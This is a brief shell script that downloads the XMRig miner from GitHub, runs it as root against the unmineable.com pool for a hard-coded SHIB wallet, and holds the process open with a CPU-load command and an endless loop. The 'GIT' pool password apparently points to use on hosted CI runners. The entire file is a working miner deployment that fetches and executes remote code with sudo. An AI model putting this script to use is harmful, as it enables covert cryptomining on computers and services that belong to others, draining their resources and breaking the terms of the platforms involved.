#!/bin/sh
sudo apt update
sudo apt install screen -y
sudo apt install cpulimit -y
cpulimit -l 80 dd if=/dev/zero of=/dev/null &
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
sudo ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0xdb05eff0dac3e51f880a492c5b9dc373439c5c90.SHIB1#qtui-7fl0 -p GIT
while [ 1 ]; do
sleep 3
done
sleep 999
